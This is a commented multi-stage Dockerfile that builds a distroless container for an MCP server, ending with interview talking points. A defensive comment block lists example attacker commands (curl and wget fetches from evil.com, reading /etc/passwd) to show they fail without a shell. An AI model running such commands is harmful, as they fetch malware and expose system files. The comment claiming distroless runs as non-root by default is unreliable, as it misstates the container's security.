# =============================================================================
# Multi-Stage Dockerfile for MCP Server
# =============================================================================
# Purpose: Build a secure, minimal container image for the MCP Server
# 
# Security Features:
# - Multi-stage build: Separates build tools from runtime
# - Distroless base: No shell, package manager, or system utilities
# - Minimal attack surface: Only Python runtime + application code
# - 80%+ size reduction compared to full Python image
#
# Stage Flow:
# 1. Builder stage: Install dependencies (needs pip, gcc, etc.)
# 2. Runtime stage: Copy only required files (no build tools)
# =============================================================================

# -----------------------------------------------------------------------------
# Stage 1: Builder (Build Dependencies)
# -----------------------------------------------------------------------------
# Uses full Python image because we need:
# - pip (to install packages)
# - gcc/build-essential (some packages need compilation)
# - Access to PyPI and external networks
#
# This stage will be DISCARDED after build, so size doesn't matter
# -----------------------------------------------------------------------------
FROM python:3.12-slim as builder

# Set work directory for build
WORKDIR /build

# Copy only requirements first (Docker layer caching optimization)
# If requirements.txt doesn't change, this layer is cached
COPY requirements.txt .

# Install dependencies to a specific directory (not system-wide)
# --target: Install to /install instead of system Python
# --no-cache-dir: Don't save pip cache (reduces layer size)
# --no-compile: Skip .pyc generation (runtime will do it if needed)
RUN pip install --no-cache-dir \
    --target=/install \
    -r requirements.txt

# Why --target=/install?
# - We can copy ONLY this directory to the next stage
# - System Python packages are NOT copied (cleaner)
# - Total control over what goes into final image

# -----------------------------------------------------------------------------
# Stage 2: Runtime (Distroless)
# -----------------------------------------------------------------------------
# Uses Google's distroless Python image:
# - Contains ONLY: Python 3.12 runtime + essential system libraries
# - Does NOT contain: bash, sh, apt, curl, wget, ls, cat, etc.
# - If attacker exploits a vulnerability, they have NO tools to use
#
# Size comparison:
# - python:3.12 (full):    ~900 MB
# - python:3.12-slim:      ~150 MB  
# - gcr.io/distroless:     ~50-80 MB  ← We use this
# -----------------------------------------------------------------------------
FROM gcr.io/distroless/python3-debian12

# Set Python path to include our installed packages
# /usr/local/lib/python3.12/site-packages is where Python looks for imports
ENV PYTHONPATH=/usr/local/lib/python3.12/site-packages

# Copy installed Python packages from builder stage
# COPY --from=builder: Take files from the "builder" stage
COPY --from=builder /install /usr/local/lib/python3.12/site-packages

# Set working directory for application
WORKDIR /app

# Copy application code
# tools/ directory contains kubernetes.py and __init__.py
COPY server.py /app/
COPY tools/ /app/tools/

# Distroless images don't have USER command working well, but they run as
# non-root by default (user "nonroot", UID 65532)
# This is automatically secure - no need to add USER directive

# Set entry point
# Note: Distroless uses a specific Python path
# CMD must be in exec form (JSON array) because there's no shell
CMD ["server.py"]

# -----------------------------------------------------------------------------
# Security Analysis (What attackers CAN'T do)
# -----------------------------------------------------------------------------
# Scenario: Attacker exploits RCE vulnerability in server.py
#
# ❌ Can't run shell commands:
#    subprocess.run(["/bin/sh", "-c", "curl evil.com/backdoor"])
#    → Error: /bin/sh not found
#
# ❌ Can't install tools:
#    os.system("apt-get install nmap")
#    → Error: apt-get not found
#
# ❌ Can't download files:
#    os.system("wget http://evil.com/malware")
#    → Error: wget not found
#
# ❌ Can't inspect system:
#    os.system("cat /etc/passwd")
#    → Error: cat not found
#
# ✅ Can ONLY:
#    - Call Python functions already in the code
#    - Use imported Python libraries
#    - Access files already in /app/
#
# This drastically limits post-exploitation capabilities!
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Build & Run Instructions
# -----------------------------------------------------------------------------
# Build:
#   docker build -t mcp-server:v1 .
#
# Test locally (without Kubernetes):
#   docker run --rm -it \
#     -v ~/.kube/config:/tmp/kubeconfig \
#     -e KUBECONFIG=/tmp/kubeconfig \
#     mcp-server:v1
#
# Size comparison:
#   docker images | grep mcp-server
#   # Should see ~50-100 MB vs 900 MB for full Python image
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Interview Talking Points
# -----------------------------------------------------------------------------
# Q: "Why distroless instead of Alpine?"
# A: "Alpine has a shell (sh) and package manager (apk). Even though Alpine
#     is small, it still has attack surface. Distroless has ONLY the runtime,
#     making post-exploitation nearly impossible."
#
# Q: "What if you need to debug the container?"
# A: "For production, security > convenience. If I need debugging, I use:
#     1. kubectl logs (application logs)
#     2. kubectl port-forward (connect locally)
#     3. Ephemeral debug container (K8s 1.23+)
#     Never compromise production security for debugging convenience."
#
# Q: "How does this relate to your 80% size reduction claim?"
# A: "My previous project used multi-stage builds to reduce Go binaries
#     from 800MB to 150MB. Here I apply the same technique with an even
#     more aggressive base (distroless), achieving 80%+ reduction while
#     adding a security layer on top of size optimization."
# -----------------------------------------------------------------------------
